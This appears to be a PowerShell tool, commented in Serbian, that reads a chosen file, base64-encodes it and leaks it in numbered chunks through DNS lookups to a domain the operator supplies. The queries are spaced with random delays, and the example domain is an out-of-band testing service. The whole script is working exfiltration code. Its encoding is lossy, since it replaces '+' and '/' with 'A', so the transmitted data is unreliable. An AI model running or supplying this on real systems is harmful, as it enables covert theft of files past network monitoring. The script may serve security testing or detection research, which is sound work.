# Unos domena i putanje do fajla
$Domain = Read-Host "Unesite domen (npr. abc123.oast.site)"
$TargetFile = Read-Host "Unesite punu putanju do ciljnog fajla (npr. C:\\Users\\Korisnik\\Desktop\\primer.txt)"

# Provera postojanja fajla
if (-Not (Test-Path -Path $TargetFile -PathType Leaf)) {
    Write-Host "Greška: Fajl na putanji '$TargetFile' ne postoji."
    exit
}

# Slanje podataka preko DNS upita
function Send-DataDNS {
    param($data)
    $maxLabelLength = 63
    $chunks = @()
    for ($i = 0; $i -lt $data.Length; $i += $maxLabelLength) {
        $chunks += $data.Substring($i, [Math]::Min($maxLabelLength, $data.Length - $i))
    }

    $id = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })

    for ($i = 0; $i -lt $chunks.Count; $i++) {
        $index = ($i + 1).ToString("D3")  # numeracija sa 3 cifre: 001, 002...
        $sub = "$index.$($chunks[$i]).$id.$Domain"
        Write-Host "[DNS] Sending: $sub"
        try {
            Resolve-DnsName -Name $sub -ErrorAction SilentlyContinue | Out-Null
        } catch {}
        Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 1500)
    }
}

# Obrada fajla
function Process-File {
    param($file)
    try {
        $content = Get-Content -Path $file -Raw -ErrorAction Stop
        Write-Host "[DEBUG] Raw content length: $($content.Length)"
        Write-Host "[DEBUG] First 100 characters:"
        Write-Host ($content.Substring(0, [Math]::Min(100, $content.Length)))
        Write-Host "[DEBUG] Content type: $($content.GetType().FullName)"
        Write-Host "[DEBUG] Byte count: $([System.Text.Encoding]::UTF8.GetByteCount($content))"

        if ($content.Length -gt 0) {
            $encoding = [System.Text.Encoding]::UTF8
            $bytes = $encoding.GetBytes($content)
            Write-Host "[INLINE DEBUG] Manual byte length: $($bytes.Length)"
            $base64 = [Convert]::ToBase64String($bytes)
            Write-Host "[INLINE DEBUG] Manual base64 length: $($base64.Length)"
            $base64 = $base64 -replace '=', ''
            $base64 = $base64 -replace '[+/]', 'A'
            Write-Host "[INFO] Encoded data length: $($base64.Length)"
            Send-DataDNS -data $base64
        }
    } catch {
        Write-Host "[ERROR] Problem pri obradi fajla."
    }
}

Process-File -file $TargetFile
